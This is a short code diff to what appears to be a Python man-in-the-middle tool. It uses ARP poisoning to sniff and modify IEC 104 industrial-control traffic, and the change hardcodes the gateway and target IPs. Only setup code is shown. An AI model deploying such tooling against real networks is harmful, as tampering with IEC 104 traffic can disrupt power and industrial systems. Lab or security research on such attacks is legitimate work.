@@ -21,7 +21,7 @@ interface = ""
 def set_parameters():
     ip_target = input('Enter target IP address :')
     ip_gateway = input('Enter gateway IP address :')
-    ip_attack = input('Enter target attack address :')
+    ip_attack = input('Enter IP attack address :')
     interface = input('Enter used interface :')
 
 
@@ -111,8 +111,8 @@ def loop_sleep():
 def main_sniff():
     set_parameters()
 
-    mac_router = ARP_poisoning().get_mac(ip_gateway)
-    mac_target = ARP_poisoning().get_mac(ip_target)
+    mac_router = ARP_poisoning().get_mac("192.168.10.10")
+    mac_target = ARP_poisoning().get_mac("192.168.10.11")
 
     ARP_poisoning().stop_ip_forward()
     print("MitM with sniffing & IEC 104 packet modification until ctrl-c")
